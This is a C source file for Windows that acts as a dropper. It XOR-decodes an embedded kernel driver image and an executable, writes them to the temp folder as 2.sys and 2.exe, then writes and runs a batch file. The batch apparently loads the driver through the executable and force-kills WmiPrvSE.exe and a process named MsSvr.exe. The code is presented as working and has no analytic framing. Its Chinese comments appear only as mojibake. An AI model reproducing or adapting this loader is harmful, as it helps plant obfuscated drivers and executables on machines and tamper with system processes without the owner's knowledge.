#define _CRT_SECURE_NO_WARNINGS
#include <Windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include"sys.h"
#include"exe.h"


int main() {

	DWORD dwImageSize;
	HANDLE hFile;


	dwImageSize = sizeof(sysData);
	unsigned char* pMemory = (unsigned char*)malloc(dwImageSize);             //�����ֻ����.sys�ļ�������
	memcpy(pMemory, sysData, dwImageSize);
	for (ULONG i = 0; i < dwImageSize; i++)
	{
		pMemory[i] ^= 0xd8;
		pMemory[i] ^= 0xcd;
	}

	char bufPath[MAX_PATH] = { 0 };
	GetTempPathA(MAX_PATH, bufPath);
	strcat(bufPath, "2.sys");
	hFile = CreateFileA(bufPath, GENERIC_WRITE, FILE_SHARE_READ,       //�ó���
		NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE)
	{
		OutputDebugStringA(bufPath);
		return false;
	}
	DWORD dwByteWrite = 0;
	if (!WriteFile(hFile, pMemory, dwImageSize, &dwByteWrite, NULL))
	{
		OutputDebugStringA(bufPath);
		CloseHandle(hFile);
		return false;
	}

	if (dwByteWrite != dwImageSize)
	{
		OutputDebugStringA(bufPath);
		CloseHandle(hFile);
		return false;
	}

	// �ر��ļ����ͷ��ڴ�
	CloseHandle(hFile);
	free(pMemory);

	//----------------------------------------------------
	// ���� exeData���ظ� sysData �Ĵ�����̣�
	dwImageSize = sizeof(exeData);  // ���� exeData �Ĵ�С
	pMemory = (unsigned char*)malloc(dwImageSize);  // Ϊ exeData �����ڴ�
	if (pMemory == NULL) {
		OutputDebugStringA("Memory allocation failed for exeData\n");
		return false;
	}

	memcpy(pMemory, exeData, dwImageSize);  // ���� exeData �� pMemory
	for (ULONG i = 0; i < dwImageSize; i++) {
		pMemory[i] ^= 0xd8;  // ������
		pMemory[i] ^= 0xcd;
	}

	// ��ȡ��ʱ·����ƴ���ļ���
	memset(bufPath, 0, MAX_PATH);
	GetTempPathA(MAX_PATH, bufPath);
	strcat(bufPath, "2.exe");  // ���ļ�����Ϊ 2.exe

	// �����ļ���д�� exeData
	hFile = CreateFileA(bufPath, GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE) {
		OutputDebugStringA("Failed to create exeData file\n");
		free(pMemory);
		return false;
	}

	if (!WriteFile(hFile, pMemory, dwImageSize, &dwByteWrite, NULL)) {
		OutputDebugStringA("WriteFile failed for exeData\n");
		CloseHandle(hFile);
		free(pMemory);
		return false;
	}

	if (dwByteWrite != dwImageSize) {
		OutputDebugStringA("Byte write mismatch for exeData\n");
		CloseHandle(hFile);
		free(pMemory);
		return false;
	}

	CloseHandle(hFile);  // �ر��ļ�
	free(pMemory);       // �ͷ� exeData �ڴ�

	//----------------------------------------------------
	// ������д�� 1K.bat �ļ�
	dwByteWrite = 0;
	memset(bufPath, 0, MAX_PATH);
	char batContent[] =
		"@pushd \"%~dp0\" >nul 2>&1\n"
		"ping 127.0.0.1 -n 5\n\n"
		"2.exe 2.sys\n"
		"taskkill /F /IM WmiPrvSE.exe\n"
		"taskkill /F /IM WmiPrvSE.exe\n\n"
		"taskkill /f /im MsSvr.exe /T\n"
		"exit\n";  // ִ�е�����������

	// ��ȡ��ʱ·����ƴ���ļ���
	GetTempPathA(MAX_PATH, bufPath);
	strcat(bufPath, "1K.bat");

	// ��ӡ������Ϣ�����·���Ƿ���ȷ
	OutputDebugStringA(bufPath);

	// �����ļ���д�� .bat ����
	hFile = CreateFileA(bufPath, GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE) {
		DWORD err = GetLastError();
		char errMsg[128];
		snprintf(errMsg, sizeof(errMsg), "Failed to create 1K.bat file (error %lu)", err);
		OutputDebugStringA(errMsg);
		return false;
	}

	// д�� .bat �ļ�����
	if (!WriteFile(hFile, batContent, strlen(batContent), &dwByteWrite, NULL)) {
		DWORD err = GetLastError();
		char errMsg[128];
		snprintf(errMsg, sizeof(errMsg), "WriteFile failed for 1K.bat (error %lu)", err);
		OutputDebugStringA(errMsg);
		CloseHandle(hFile);
		return false;
	}

	// ���д����ֽ���
	if (dwByteWrite != strlen(batContent)) {
		char errMsg[128];
		snprintf(errMsg, sizeof(errMsg), "Byte write mismatch for 1K.bat. Expected %lu, wrote %lu.", strlen(batContent), dwByteWrite);
		OutputDebugStringA(errMsg);
		CloseHandle(hFile);
		return false;
	}

	// �ر��ļ�
	CloseHandle(hFile);

	//----------------------------------------------------

		// ��ȡ��ʱĿ¼
	char bufPath2[MAX_PATH];
	GetTempPathA(MAX_PATH, bufPath2);

	// ƴ���������ļ�·��
	strcat(bufPath2, "1K.bat");

	// ��ӡ������Ϣ
	printf("׼��ִ���������ļ�: %s\n", bufPath2);

	// ʹ�� system ����ִ���������ļ�
	int result = system(bufPath2);
	if (result != 0) {
		printf("ִ���������ļ�ʧ��. ������: %d\n", result);
		return 1;
	}



	//// ������Ҫִ�е�����
	//const char* exeName = "1.exe";
	//const char* sys1 = "2.sys";
	//const char* sysFiles[] = { "3.sys", "4.sys", "5.sys" };

	//// ����ÿ�����ִ��
	//for (int i = 0; i < sizeof(sysFiles) / sizeof(sysFiles[0]); ++i) {
	//	char command[256]; // �洢����������
	//	snprintf(command, sizeof(command), "%s %s %s", exeName, sys1, sysFiles[i]);

	//	// ��ӡ����ִ�е�����
	//	printf("��������: %s\n", command);

	//	// ִ������
	//	int result = system(command);
	//	if (result != 0) {
	//		printf("����ִ��ʧ��: %s\n", command);
	//	}
	//}


	// ��ͣ����
	//printf("�����������...\n");
	//getchar();

	return 0;
}
